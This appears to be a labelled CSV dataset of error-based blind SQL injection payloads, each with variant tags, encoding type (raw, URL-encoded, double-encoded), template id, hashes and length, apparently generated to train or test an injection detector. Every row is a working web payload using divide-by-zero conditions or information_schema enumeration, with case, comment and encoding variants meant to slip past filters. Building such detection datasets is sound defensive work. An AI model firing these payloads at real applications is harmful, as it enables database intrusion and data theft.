payload,label,attack_type,variant_type,encoding_type,template_id,normalized_hash,payload_hash,length
id%3D1%27+AND+IF%28%28100%3C200%29%2C+%28SELECT+table_name+FROM+information_schema.tables%29%2C+0%29+%2523,1,sqli_blind_error,comment_url_hash,url_encoded,SQLI_BLIND_ERROR_003,29bcf3f000928a7e2bf50929ad96f04c,fda5658187af817d0c3176070f296f75,106
id%253D1%2527%2BAnd%2B%2528SELECT%2B1%252F0%2BfROM%2Bdual%2BWheRE%2BCHAR%252897%2529%253D%2527a%2527%2529%2B--,1,sqli_blind_error,case_var|comment_dash_dash,double_encoded,SQLI_BLIND_ERROR_002,0c36652ba2ed03bae2552264dcad5872,db640bc1679b16a83e9d9aa432588e51,110
id=1'  aNd  (SELECT  1/0  from  dual  Where  LENGTH('test')=4)  --  -,1,sqli_blind_error,case_var|comment_dash_dash_space|ws_multi_space,raw,SQLI_BLIND_ERROR_002,56c32a253b76354ee003c812891894e8,16b1316ff0954a7d6874d2eda1429426,69
id=1'/**/AND/**/CASE/**/WHEN/**/(7=7)/**/THEN/**/1/0/**/ELSE/**/1/**/END/**//*,1,sqli_blind_error,comment_block_comment|ws_comment_ws,raw,SQLI_BLIND_ERROR_001,57e771c2747c4e4346463d860f2f861a,306303e68ad1abe73c6d3d66aef587d8,78
"id%3D1%27 AND+IF((LENGTH(%27test%27)=4), (SELECT table_name+FROM+information_schema.tables),+0)+%3B-- -",1,sqli_blind_error,comment_semicolon_comment,partially_encoded,SQLI_BLIND_ERROR_003,210c4fa6383f595de4b9bf198c291f33,9f70ad37c880c82c9e64b5dc7b2701cd,103
"id=1%27 AND+IF(('a%27=%27a'),+(SELECT+table_name fROm information_schema.tables),+0)+--",1,sqli_blind_error,case_var|comment_dash_dash,partially_encoded,SQLI_BLIND_ERROR_003,47917877b89b17b691956e1deb03e90e,1e641927b87b242c6301ab8f76a625b2,87
id%3D1%27%2F%2A%2A%2FAND%2F%2A%2A%2FCASE%2F%2A%2A%2FWHEN%2F%2A%2A%2F%287%3D7%29%2F%2A%2A%2FTHEN%2F%2A%2A%2F1%2F0%2F%2A%2A%2FELSE%2F%2A%2A%2F1%2F%2A%2A%2FEND%2F%2A%2A%2F%3B--%2F%2A%2A%2F-,1,sqli_blind_error,comment_semicolon_comment|ws_comment_ws,url_encoded,SQLI_BLIND_ERROR_001,d069c5fbd90b21a829b38c72d8877ee2,13e475db574185d525715be64dcb084c,186
id%3D1%27+AND+CASE+WHEN+%28100%3C200%29+THEN+1%2F0+ELSE+1+END+%2523,1,sqli_blind_error,comment_url_hash,url_encoded,SQLI_BLIND_ERROR_001,e22ba0487ef46794e525bb1ad0cc9e72,87a9f158d3cc83b6b9992dfeb26e0fa8,67
id=1'+anD+(SELECT+1/0+FroM+dual+whERe+'a'='a')+;--+-,1,sqli_blind_error,case_var|comment_semicolon_comment|ws_plus,raw,SQLI_BLIND_ERROR_002,9a2e812b8152fda0ff94332b61c750e8,8671134fcc9f4d3054f1ca1c80e417a4,52
"id=1' AND IF((7=7), (SELECT table_name FROM information_schema.tables), 0) --",1,sqli_blind_error,comment_dash_dash,raw,SQLI_BLIND_ERROR_003,98eb99cfbe5750d3774b6c95a7918455,133d5941f58e91bb9f8cde96275469c8,77
"id=1' AND IF(('a'='a'), (SELECT table_name From information_schema.tables), 0) ;-- -",1,sqli_blind_error,case_var|comment_semicolon_comment|ws_space,raw,SQLI_BLIND_ERROR_003,63358c58d627e1003f75dbbf34b22b51,e2f9e7afed19bdff0f6a8b919816a4c9,84
id%3D1%27++and++IF%28%28100%3C200%29%2C++%28SELECT++table_name++from++information_schema.tables%29%2C++0%29++%3B--++-,1,sqli_blind_error,case_var|comment_semicolon_comment|ws_multi_space,url_encoded,SQLI_BLIND_ERROR_003,8f9d24c0a158b7a97f7c603cb053bf70,a278f85bc5af01e1db0cdb8327beb16f,117
id%253D1%2527%252BaNd%252BIF%2528%2528100%253C200%2529%252C%252B%2528SELECT%252Btable_name%252BFROM%252Binformation_schema.tables%2529%252C%252B0%2529%252B--,1,sqli_blind_error,case_var|comment_dash_dash|ws_plus,double_encoded,SQLI_BLIND_ERROR_003,8d5edba944ec43736be4acdfca304e10,71d7b1c770b77a8957b39a5f36025d58,157
id%3D1'+AND+(SELECT+1/0 FROM dual WHERE+LENGTH(%27test%27)%3D4) --,1,sqli_blind_error,comment_dash_dash,partially_encoded,SQLI_BLIND_ERROR_002,74a39099eea10ba2acebb12c54312ba4,67981eae81f18693bf350bd07a152f27,66
id%3D1%27+AnD+%28SELECT+1%2F0+FROM+dual+wHEre+100%3C200%29+%3B--+-,1,sqli_blind_error,case_var|comment_semicolon_comment,url_encoded,SQLI_BLIND_ERROR_002,95a53a29adffda67dae76ce2d0cccab1,f0b21427fa61b3c2b9cfddf03680c266,66
id%3D1%27%2520AND%2520IF%28%287%3D7%29%2C%2520%28SELECT%2520table_name%2520FROM%2520information_schema.tables%29%2C%25200%29%2520--,1,sqli_blind_error,comment_dash_dash|ws_url_space,url_encoded,SQLI_BLIND_ERROR_003,d38da6d05f201d6df898c4ef95a29e64,ea70e720183dd431bb265c1b961cbc36,131
id%3D1%27%2F%2A%2A%2FAND%2F%2A%2A%2FCASE%2F%2A%2A%2FWhen%2F%2A%2A%2F%28ASCII%28%27A%27%29%3D65%29%2F%2A%2A%2Fthen%2F%2A%2A%2F1%2F0%2F%2A%2A%2FELSE%2F%2A%2A%2F1%2F%2A%2A%2Fend%2F%2A%2A%2F%2F%2A,1,sqli_blind_error,case_var|comment_block_comment|ws_comment_ws,url_encoded,SQLI_BLIND_ERROR_001,cbe8e161ff927568bb9b0a74728eb770,52b1c30bbcc5330ca4985bc13b4cd76d,192
"id=1' And IF((7=7), (SELECT table_name fROM information_schema.tables), 0) /*",1,sqli_blind_error,case_var|comment_block_comment|ws_space,raw,SQLI_BLIND_ERROR_003,637b22c01e8e35e12e42c861660be3a7,9be873049a17ba301a0807c25ed31d77,77
id%3D1%27+AND (SELECT+1%2F0 FROM dual WHERE+7=7)+--,1,sqli_blind_error,comment_dash_dash,partially_encoded,SQLI_BLIND_ERROR_002,54eeb9578091374d2fdea7c7f9a1019f,21299a0eb59eb754f01b68180b8e7ef4,51
id=1'%20And%20(SELECT%201/0%20FROM%20dual%20whERe%20LENGTH('test')=4)%20;--%20-,1,sqli_blind_error,case_var|comment_semicolon_comment|ws_url_space,raw,SQLI_BLIND_ERROR_002,e54b1347afe092e5b27fe6a8a9fe4150,8beb4034109082164da957a6c95fb9c6,79
"id=1' And IF((7=7), (SELECT table_name From information_schema.tables), 0) #",1,sqli_blind_error,case_var|comment_hash,raw,SQLI_BLIND_ERROR_003,b721b43a1dae1e3d68041af3db05f060,ec08068ec2af18d2fdbb9cb244640cdc,76
"id%3D1'%20And%20IF((2%3E1),%20(SELECT%20table_name%20from%20information_schema.tables),%200)%20%2F*",1,sqli_blind_error,case_var|comment_block_comment|ws_mixed_ws,partially_encoded,SQLI_BLIND_ERROR_003,20e465e1afd06b32765f8cf83a0fa44f,b44ca4c2cedd15f03aed33489355e33c,99
id%3D1%27%2Band%2BIF%28%28%27a%27%3D%27a%27%29%2C%2B%28SELECT%2Btable_name%2Bfrom%2Binformation_schema.tables%29%2C%2B0%29%2B%23,1,sqli_blind_error,case_var|comment_hash|ws_plus,url_encoded,SQLI_BLIND_ERROR_003,6506468ed54d252b671a30b532a301a5,9636599b3272588b055fc560e8c8d037,128
id=1' AND+CASE+WHEN+(7=7) THEN+1%2F0 ELSE 1 END %23,1,sqli_blind_error,comment_url_hash|ws_space,partially_encoded,SQLI_BLIND_ERROR_001,aa0212d1843b7acd241d24f39ffea492,c4c87a2bb699963b84d3ba7ca8e10fc5,51
id%3D1%27%2BAND%2B%28SELECT%2B1%2F0%2Bfrom%2Bdual%2BwHEre%2B1%3D1%29%2B--%2B-,1,sqli_blind_error,case_var|comment_dash_dash_space|ws_plus,url_encoded,SQLI_BLIND_ERROR_002,d1848904001a124c1de2efcd1aafd1da,fe90f43e46f709d2cfdda1a2c032f8be,77
id%3D1%27%2BAND%2BCASE%2BWHEN%2B%28%27a%27%3D%27a%27%29%2BTHEN%2B1%2F0%2BELSE%2B1%2BEND%2B%2523,1,sqli_blind_error,comment_url_hash|ws_plus,url_encoded,SQLI_BLIND_ERROR_001,b2d437245871eaa0075a3d110892769d,8acc4dffa56f400159a3d0cd0227ccb8,95
id%3D1%27%2F%2A*/anD/%2A*%2F(SELECT%2F%2A*/1%2F0%2F%2A%2A%2FFrom/*%2A%2Fdual%2F%2A%2A/WHERE/**/100%3C200)%2F%2A%2A/%23,1,sqli_blind_error,case_var|comment_url_hash|ws_comment_ws,partially_encoded,SQLI_BLIND_ERROR_002,9961b6de458821ec5e8d443be9fa1fc8,9a149d69a7be8dd9a46504d32f8fe2fc,118
"id=1'/**/AND/**/IF((LENGTH('test')=4),/**/(SELECT/**/table_name/**/FROM/**/information_schema.tables),/**/0)/**/#",1,sqli_blind_error,case_var|comment_hash|ws_comment_ws,raw,SQLI_BLIND_ERROR_003,540d49717b80da59ef84a7f8e9b846ef,a37422eeebc0654e667e0a28bbf0bde3,113
id%253D1%2527%252Band%252BIF%2528%25287%253D7%2529%252C%252B%2528SELECT%252Btable_name%252BFrom%252Binformation_schema.tables%2529%252C%252B0%2529%252B--,1,sqli_blind_error,case_var|comment_dash_dash|ws_plus,double_encoded,SQLI_BLIND_ERROR_003,69204e4e275119e7205fcc3a40eb70f5,2b435cd1e4a224b5183e6046c8abeecf,153
"id%3D1'+AND+IF((1=1),+(SELECT table_name FROM+information_schema.tables),+0)+%23",1,sqli_blind_error,comment_hash,partially_encoded,SQLI_BLIND_ERROR_003,0cc8573cb9656bd85b672dc251459fce,e500cf01059724ff6213e1651242b885,80
id%3D1%27+AND+IF%28%28%27a%27%3D%27a%27%29%2C+%28SELECT+table_name+FROM+information_schema.tables%29%2C+0%29+%23,1,sqli_blind_error,comment_hash,url_encoded,SQLI_BLIND_ERROR_003,15369b312fcdb3a42579b0a237ac2fc1,717f4f4a4ff3a87a4163932dde2788c3,112
id%3D1'+AND+Case+wHen+(ASCII(%27A')=65)+THEN+1/0+Else+1+End+--+-,1,sqli_blind_error,case_var|comment_dash_dash_space|ws_plus,partially_encoded,SQLI_BLIND_ERROR_001,51723377e0d7a580311f5d6f0cf880f2,23f4bd03fd79c53a34daab4373af1aa8,64
id=1' AND CASE WHEN (7=7) THEN 1/0 ELSE 1 END %23,1,sqli_blind_error,comment_url_hash|ws_space,raw,SQLI_BLIND_ERROR_001,86a78b8f6e6037c385127c87a220c881,4efbdb6ce003dba17abb2d5595c7d0d3,49
"id=1%27	and	IF(('a%27%3D%27a'),	(SELECT	table_name	FROM	information_schema.tables),	0)	--",1,sqli_blind_error,case_var|comment_dash_dash|ws_tab,partially_encoded,SQLI_BLIND_ERROR_003,9a1faed4ca6966a831b6124a3b0f515f,1e55cd3d9241f5a93c9d3ed3d5be21c1,89
id%3D1%27/%2A%2A%2FanD%2F%2A%2A/case%2F**/When%2F**%2F('a%27='a%27)%2F**%2FtHEn%2F*%2A/1/0/*%2A%2FElse/*%2A%2F1%2F%2A%2A%2FEnd/*%2A%2F%23,1,sqli_blind_error,case_var|comment_url_hash|ws_comment_ws,partially_encoded,SQLI_BLIND_ERROR_001,0ca0001ba3126cf69c49d4b7fa2b9aa2,25515a6b77fa764659a6e3de3afa9d40,137
id=1' and CASE when (2>1) THen 1/0 ElSe 1 end -- -,1,sqli_blind_error,case_var|comment_dash_dash_space,raw,SQLI_BLIND_ERROR_001,ce492da7dec1e67d0018e9cd5af0bdee,88b817cbed38f9088a6771ac954bab29,50
id=1%27 AND+(SELECT+1/0 FROM dual+WHERE+1%3D1)+--+-,1,sqli_blind_error,comment_dash_dash_space,partially_encoded,SQLI_BLIND_ERROR_002,1c790d8bd0a43b2813176dffe8cd9967,614fdcddff3aca605c2f29fce9af17cf,51
id=1'+AND+CASE+WHEN+(2>1)+THEN+1/0+ELSE+1+END+#,1,sqli_blind_error,comment_hash|ws_plus,raw,SQLI_BLIND_ERROR_001,ee6138a57d7d94558d801d16efc77d43,98b5f5878640ad01ad68e22b70b15c44,47
id%3D1%27+AND+CASE+WHEN+%28LENGTH%28%27test%27%29%3D4%29+THEN+1%2F0+ELSE+1+END+%2523,1,sqli_blind_error,comment_url_hash,url_encoded,SQLI_BLIND_ERROR_001,563e128a2f357b95cc2410ad987e6f09,a1a1de1ea034aa8dd6c55b5022f027c5,84
id=1'+AND+Case+when (ASCII('A%27)=65)+Then 1%2F0+ELSE+1+end+%3B--+-,1,sqli_blind_error,case_var|comment_semicolon_comment,partially_encoded,SQLI_BLIND_ERROR_001,2f234ecdb4eae647649e69944041e998,b8fe772a4c2a06552905b1d8070f61e2,67
id=1'  AND  caSe  WhEn  (2>1)  then  1/0  else  1  eNd  ;--  -,1,sqli_blind_error,case_var|comment_semicolon_comment|ws_multi_space,raw,SQLI_BLIND_ERROR_001,fc4f879c7f8652e9a3128801b914acdb,d70fad656c69057b757cf89470b1b420,62
id%253D1%2527%2Band%2BIF%2528%25281%253D1%2529%252C%2B%2528SELECT%2Btable_name%2Bfrom%2Binformation_schema.tables%2529%252C%2B0%2529%2B--%2B-,1,sqli_blind_error,case_var|comment_dash_dash_space,double_encoded,SQLI_BLIND_ERROR_003,578688b6ac56326c65041370731c9572,349b732983726bf9f1712076e4082e3d,141
id%3D1%27++AND++%28SELECT++1%2F0++FROM++dual++WHERE++LENGTH%28%27test%27%29%3D4%29++%2523,1,sqli_blind_error,comment_url_hash|ws_multi_space,url_encoded,SQLI_BLIND_ERROR_002,5955e4b5c303bfb2c84eb9684b1a5789,1feb7f7f95ad4585f5f8f7317c46854f,89
id=1'%20And%20(SELECT%201/0%20fRoM%20dual%20whEre%20'a'='a')%20/*,1,sqli_blind_error,case_var|comment_block_comment|ws_mixed_ws,raw,SQLI_BLIND_ERROR_002,437d166a6d2d69c6ae46e709bbedbc09,66674a08e13744b0bf15fab11d948504,65
id%253D1%2527%252520And%252520%2528SELECT%2525201%252F0%252520FROM%252520dual%252520Where%252520%2527a%2527%253D%2527a%2527%2529%252520%253B--%252520-,1,sqli_blind_error,case_var|comment_semicolon_comment|ws_url_space,double_encoded,SQLI_BLIND_ERROR_002,8cf73246b38d42b6a56c3bf57be71650,88274c8100d84d803583ad2ec46e7ec3,150
id%3D1%27+and+caSe+WHEN+%281%3D1%29+then+1%2F0+else+1+END+--,1,sqli_blind_error,case_var|comment_dash_dash,url_encoded,SQLI_BLIND_ERROR_001,46f0f9ab142599c8c03da3ab110a53e0,6980f3ba648962469585e78ea2d3eb0f,60
id%3D1%27+AND+CASE+WHEN+%28ASCII%28%27A%27%29%3D65%29+THEN+1%2F0+ELSE+1+END+--,1,sqli_blind_error,comment_dash_dash,url_encoded,SQLI_BLIND_ERROR_001,a08e0c2b39bf0a8db8661467780a57a2,1ebf30332d735e1d048d1a720ea4c235,78
id%3D1%27%09AnD%09cAse%09WHEn%09%28LENGTH%28%27test%27%29%3D4%29%09THEN%091%2F0%09ELSE%091%09eNd%09--%09-,1,sqli_blind_error,case_var|comment_dash_dash_space|ws_tab,url_encoded,SQLI_BLIND_ERROR_001,c858cf58dc18b48009c59a80edddf770,0b068a53a5e085d408d39c2c5a9fe456,105
id=1%27+and (SELECT+1/0+FrOM+dual+WHERE+1%3D1)+--,1,sqli_blind_error,case_var|comment_dash_dash,partially_encoded,SQLI_BLIND_ERROR_002,e0a903f397c602e626dd9f053d412109,cc8a125bec35aca93631b8d9e75becf3,49
"id%3D1%27+AND+IF((ASCII('A')=65),+(SELECT+table_name+FROM+information_schema.tables),+0)+%2F*",1,sqli_blind_error,case_var|comment_block_comment|ws_plus,partially_encoded,SQLI_BLIND_ERROR_003,fb6597305b5f9e33730cd50e549a3a92,ba961cc78816856d269a74d900e17a91,93
id=1'%20and%20Case%20when%20('a'='a')%20Then%201/0%20ElSe%201%20end%20--%20-,1,sqli_blind_error,case_var|comment_dash_dash_space|ws_url_space,raw,SQLI_BLIND_ERROR_001,4c96db657cec35a79b2908a5809b22e3,3db83b0c4b7a523898200971bd068c85,76
id=1'/**/AND/**/(SELECT/**/1/0/**/FROM/**/dual/**/WHERE/**/1=1)/**/--,1,sqli_blind_error,case_var|comment_dash_dash|ws_comment_ws,raw,SQLI_BLIND_ERROR_002,6d20fcbab473754fc02f4429c41878d8,755ae3caa4e21401a59d5c97ddcfd231,69
id%253D1%2527%2509AND%2509IF%2528%2528100%253C200%2529%252C%2509%2528SELECT%2509table_name%2509FROM%2509information_schema.tables%2529%252C%25090%2529%2509%252F%252A,1,sqli_blind_error,comment_block_comment|ws_tab,double_encoded,SQLI_BLIND_ERROR_003,f3664ebc4efe1e22890f68f7fbde49a6,1bda4145b1f90eafadd7982234b17d1f,165
id%253D1%2527%2509And%2509IF%2528%2528100%253C200%2529%252C%2509%2528SELECT%2509table_name%2509From%2509information_schema.tables%2529%252C%25090%2529%2509--,1,sqli_blind_error,case_var|comment_dash_dash|ws_tab,double_encoded,SQLI_BLIND_ERROR_003,4a5e1a45877328f9e9277c19b4b570af,4601049a2e55b10284fc3865001cc4fa,157
id%3D1%27	and	CASE	wHeN	(CHAR(97)%3D'a')	tHEn	1/0	else	1	end	%23,1,sqli_blind_error,case_var|comment_url_hash|ws_tab,partially_encoded,SQLI_BLIND_ERROR_001,5e69a69169089d8428cf23c5923f9e27,fc657379b9fda4d5625588ffdd098817,64
id%3D1%27+And+IF%28%28ASCII%28%27A%27%29%3D65%29%2C+%28SELECT+table_name+From+information_schema.tables%29%2C+0%29+%23,1,sqli_blind_error,case_var|comment_hash,url_encoded,SQLI_BLIND_ERROR_003,3bfe99364df347c61f3a48163c1575e5,40e28920f7ee5fb22f98a3b05f43a01c,118
id%253D1%2527%252520AND%252520%2528SELECT%2525201%252F0%252520FROM%252520dual%252520whERe%2525207%253D7%2529%252520--,1,sqli_blind_error,case_var|comment_dash_dash|ws_mixed_ws,double_encoded,SQLI_BLIND_ERROR_002,43247ff9268dc6b8593d31095740cd7f,8d3f46b8f617202906afacfd891a040b,117
id%253D1%2527%2BAND%2BIF%2528%2528ASCII%2528%2527A%2527%2529%253D65%2529%252C%2B%2528SELECT%2Btable_name%2BFROM%2Binformation_schema.tables%2529%252C%2B0%2529%2B%252523,1,sqli_blind_error,comment_url_hash|ws_space,double_encoded,SQLI_BLIND_ERROR_003,a2bd98a80f87c49fccd2b8e9e9ae981f,5ea760cec6e81ee6e657c427d51c9dde,168
id%3D1%27 anD (SELECT+1/0 From dual+WHERE+2%3E1)+%23,1,sqli_blind_error,case_var|comment_hash,partially_encoded,SQLI_BLIND_ERROR_002,4a65d38a123da330d0d5d2858a41d84e,6d884897c5136c5f913f12afc195d968,52
"id=1' and IF((CHAR(97)='a'), (SELECT table_name From information_schema.tables), 0) %23",1,sqli_blind_error,case_var|comment_url_hash,raw,SQLI_BLIND_ERROR_003,31779819f118a20f4766c53a2aa2400b,67b641bd434e4ee6d3732ac0eca17215,87
id%3D1%27%20AND%20(SELECT%201/0%20FROM%20dual%20WHERE%20ASCII(%27A%27)=65)%20%3B--%20-,1,sqli_blind_error,comment_semicolon_comment|ws_url_space,partially_encoded,SQLI_BLIND_ERROR_002,014ba0bb3ebe5480c506b3f9883c41d4,f8b1ad7ec75ba72ad612b2435b282393,86
id%3D1' AND (SELECT+1%2F0 FROM+dual WHERE+%27a'='a')+%3B-- -,1,sqli_blind_error,comment_semicolon_comment,partially_encoded,SQLI_BLIND_ERROR_002,8b87198eb542f8a3531e6d700c1ef528,84e73dd6345f0b6f65a089406147cb55,60
id%253D1%2527%2BAnd%2B%2528SELECT%2B1%252F0%2Bfrom%2Bdual%2BWhERe%2BLENGTH%2528%2527test%2527%2529%253D4%2529%2B%253B--%2B-,1,sqli_blind_error,case_var|comment_semicolon_comment,double_encoded,SQLI_BLIND_ERROR_002,3f6d362d01c9b672872b607d7b889589,eeaa5753ca79af7b7cf2ba76a26c7254,123
id=1%27%20AND%20(SELECT%201/0%20FROM%20dual%20WHERE%201=1)%20--,1,sqli_blind_error,comment_dash_dash|ws_url_space,partially_encoded,SQLI_BLIND_ERROR_002,9da9e481dec10b447600778dea709823,16804a322ade03e7d6f012bc29d09d3b,63
id=1'   And   case   When   (CHAR(97)='a')   theN   1/0   ELSE   1   END   #,1,sqli_blind_error,case_var|comment_hash|ws_mixed_ws,raw,SQLI_BLIND_ERROR_001,103003b94c1c607dd75bda37252d2cb0,37196cfdadf101c36a8f256669984c4b,76
id%3D1%27+and+(SELECT 1/0 from+dual+where 100<200) ;-- -,1,sqli_blind_error,case_var|comment_semicolon_comment,partially_encoded,SQLI_BLIND_ERROR_002,97c57eee69623b77c091771188304ace,2febdd1e3f9a4716e3106ebbd3a76c70,56
id%253D1%2527%2Band%2BIF%2528%25281%253D1%2529%252C%2B%2528SELECT%2Btable_name%2BFrom%2Binformation_schema.tables%2529%252C%2B0%2529%2B--,1,sqli_blind_error,case_var|comment_dash_dash|ws_space,double_encoded,SQLI_BLIND_ERROR_003,94f9086c5babb359705e9636c3525db4,a3e6c35da78afa55f64da14146fbd04e,137
"id%3D1' AND IF((100<200), (SELECT+table_name FROM+information_schema.tables),+0)+%3B-- -",1,sqli_blind_error,comment_semicolon_comment,partially_encoded,SQLI_BLIND_ERROR_003,9663f2533b45a6762980f31deaccd6a4,7ac231f6b97e3d4163f7569dbe1a89d4,88
id%3D1%27+AND+IF%28%28ASCII%28%27A%27%29%3D65%29%2C+%28SELECT+table_name+FROM+information_schema.tables%29%2C+0%29+--+-,1,sqli_blind_error,comment_dash_dash_space,url_encoded,SQLI_BLIND_ERROR_003,b73d4c1e5a1e2acb597cb9bcfa02afe3,288a23f51c94365befea4dcd67946b8e,119
"id=1' AND IF(('a'='a'), (SELECT table_name FROM information_schema.tables), 0) --",1,sqli_blind_error,comment_dash_dash,raw,SQLI_BLIND_ERROR_003,166f97a73c9b7d129bf5bf1555fa918e,173dbbee04fe081419407022213817c5,81
id%253D1%2527%2BAnD%2B%2528SELECT%2B1%252F0%2Bfrom%2Bdual%2BWHeRe%2B2%253E1%2529%2B%252F%252A,1,sqli_blind_error,case_var|comment_block_comment,double_encoded,SQLI_BLIND_ERROR_002,1c8cbfbc73ee0b75fe7069c688bd09c3,03f95638a82aa80c293067d797d139f7,93
id%3D1%27%09AND%09%28SELECT%091%2F0%09from%09dual%09where%09CHAR%2897%29%3D%27a%27%29%09--,1,sqli_blind_error,case_var|comment_dash_dash|ws_tab,url_encoded,SQLI_BLIND_ERROR_002,7e1fd75a986bf649a86f71706c6793ea,0114c1ad8b3979450de4dfac6afc286a,90
id%3D1%27%2BAnd%2B%28SELECT%2B1%2F0%2BFrom%2Bdual%2BWHERE%2B%27a%27%3D%27a%27%29%2B%2523,1,sqli_blind_error,case_var|comment_url_hash|ws_plus,url_encoded,SQLI_BLIND_ERROR_002,e08cb0907fec0f833d007f550c257afe,e319daac26d5ac57010b3b95c95ed919,88
"id%3D1%27%2F%2A*%2FAnd/*%2A/IF((1=1),/%2A%2A/(SELECT/%2A%2A%2Ftable_name%2F%2A%2A%2Ffrom/%2A*%2Finformation_schema.tables),%2F%2A%2A/0)%2F%2A%2A/--%2F%2A*/-",1,sqli_blind_error,case_var|comment_dash_dash_space|ws_comment_ws,partially_encoded,SQLI_BLIND_ERROR_003,0ca85110a5ce2e0199b72e615006d7d9,87fbde9ab1810f48184a1e50ebad1f23,156
id=1' AND CASE WHEN (1=1) THEN 1/0 ELSE 1 END --,1,sqli_blind_error,comment_dash_dash|ws_space,raw,SQLI_BLIND_ERROR_001,f367ed2a6b231da9d762413e312cd966,b1940f229fffe9506cde25f5c2262fdc,48
id=1'+and+cAse+when+(1=1)+THEN+1/0+elSe+1+end+#,1,sqli_blind_error,case_var|comment_hash|ws_plus,raw,SQLI_BLIND_ERROR_001,7f3066bbe43d810cd0989099910392c3,6825b4ed0c80cdcd62ea35d2cfb11352,47
id%253D1%2527%2509and%2509Case%2509WHEN%2509%2528ASCII%2528%2527A%2527%2529%253D65%2529%2509then%25091%252F0%2509Else%25091%2509END%2509--%2509-,1,sqli_blind_error,case_var|comment_dash_dash_space|ws_tab,double_encoded,SQLI_BLIND_ERROR_001,402b9a4241006936dab39b2d9835a7ee,63a0a8f4f3ead3021aac826454520fd1,144
id%3D1%27	AND	Case	when	(ASCII(%27A%27)=65)	THEN	1%2F0	Else	1	end	#,1,sqli_blind_error,case_var|comment_hash|ws_tab,partially_encoded,SQLI_BLIND_ERROR_001,4688946266d4404144c093a246a1381c,1ace63e777d2b69680e265efb63e4a79,67
id%253D1%2527%2509AND%2509CASE%2509when%2509%2528LENGTH%2528%2527test%2527%2529%253D4%2529%2509THEN%25091%252F0%2509else%25091%2509END%2509--%2509-,1,sqli_blind_error,case_var|comment_dash_dash_space|ws_tab,double_encoded,SQLI_BLIND_ERROR_001,66794b354902a88a276d21ab765192d1,e25106c0cb42ed155a04a4273daec85b,147
id%253D1%2527%2BAND%2BCASE%2BWHEN%2B%25282%253E1%2529%2BTHEN%2B1%252F0%2BELSE%2B1%2BEND%2B%2523,1,sqli_blind_error,comment_hash,double_encoded,SQLI_BLIND_ERROR_001,163cdaf4f256fa56752a646dacc121ce,1898d476777ed82f7440c2b7f5fcb449,95
id=1'+And+CASE+whEn+('a'='a')+ThEN+1/0+else+1+end+/*,1,sqli_blind_error,case_var|comment_block_comment|ws_plus,raw,SQLI_BLIND_ERROR_001,aa728914222e31a5a8f7df0fe6106edb,8bd71946f4d8184e28ef085276edd1bc,52
id%3D1%27%2F%2A%2A%2FAnd%2F%2A%2A%2Fcase%2F%2A%2A%2Fwhen%2F%2A%2A%2F%28ASCII%28%27A%27%29%3D65%29%2F%2A%2A%2FtHEN%2F%2A%2A%2F1%2F0%2F%2A%2A%2FElse%2F%2A%2A%2F1%2F%2A%2A%2Fend%2F%2A%2A%2F--%2F%2A%2A%2F-,1,sqli_blind_error,case_var|comment_dash_dash_space|ws_comment_ws,url_encoded,SQLI_BLIND_ERROR_001,f9431cf1155a85d3b01b85927b505da4,55b196664b09dd2d971165ba7d9b940e,201
id%253D1%2527%2BaND%2B%2528SELECT%2B1%252F0%2BFrom%2Bdual%2BWHERE%2B1%253D1%2529%2B%2523,1,sqli_blind_error,case_var|comment_hash,double_encoded,SQLI_BLIND_ERROR_002,91a168d16cb5931dc6198322765ed1d4,afcc1eac1c7afc7aaecd6f414798cf13,88
id%3D1%27%2Band%2BIF%28%28LENGTH%28%27test%27%29%3D4%29%2C%2B%28SELECT%2Btable_name%2Bfrom%2Binformation_schema.tables%29%2C%2B0%29%2B%2F%2A,1,sqli_blind_error,case_var|comment_block_comment|ws_plus,url_encoded,SQLI_BLIND_ERROR_003,7509d1ff4c94092f4ed55ea6d1a39263,e8848e1f5be9b1b68b86eae083ddcf6c,140
"id=1'	ANd	IF((100<200),	(SELECT	table_name	FROM	information_schema.tables),	0)	--",1,sqli_blind_error,case_var|comment_dash_dash|ws_tab,raw,SQLI_BLIND_ERROR_003,faa131f39bcd0ffda832d79255bc8ca8,4c97f4ae605da3217d75eba623abdb0b,81
id%3D1%27%2BAND%2BcaSe%2Bwhen%2B%282%3E1%29%2Bthen%2B1%2F0%2BElse%2B1%2BenD%2B%23,1,sqli_blind_error,case_var|comment_hash|ws_plus,url_encoded,SQLI_BLIND_ERROR_001,73ce2a6a72c88ee81ece80debf913947,13d87f557a7c8d199aa29db0c04b8730,81
id=1%27+AND CASE+WHEN (7%3D7)+THEN 1/0+ELSE+1+END /%2A,1,sqli_blind_error,comment_block_comment,partially_encoded,SQLI_BLIND_ERROR_001,9db21526cc4394632f8a17782f563e20,f089e8743d3e75a9043f3bdfcf6a1546,54
